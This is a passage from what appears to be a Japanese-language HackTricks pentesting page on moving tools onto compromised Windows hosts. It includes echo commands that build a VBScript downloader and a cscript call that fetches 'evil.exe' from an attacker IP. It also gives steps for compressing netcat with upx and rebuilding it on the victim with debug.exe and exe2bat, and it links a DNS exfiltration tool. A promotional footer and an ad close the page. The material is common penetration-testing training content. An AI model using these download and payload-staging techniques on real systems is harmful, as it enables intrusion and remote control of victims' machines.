echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

これはWindows 32ビットマシンで動作するクレイジーなテクニックです。アイデアは、`debug.exe`プログラムを使用することです。これはデバッガのようにバイナリを検査するために使用されます。しかし、それはまた、16進数からバイナリを再構築することもできます。したがって、アイデアは、`netcat`のようなバイナリを取り、それを16進数に逆アセンブルし、それを侵害されたマシン上のファイルに貼り付け、そして`debug.exe`でアセンブルすることです。

`Debug.exe`は64 KBしかアセンブルできません。したがって、それよりも小さいファイルを使用する必要があります。さらに、それをさらに圧縮するためにupxを使用することができます。それでは、それをやってみましょう：
```
upx -9 nc.exe
```
今ではわずか29 kbしかありません。完璧です。では、それを分解しましょう：
```
wine exe2bat.exe nc.exe nc.txt
```
今、テキストをWindowsシェルにコピーして貼り付けるだけです。すると、自動的にnc.exeという名前のファイルが作成されます。

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できます。Intruderは攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステム全体にわたる問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
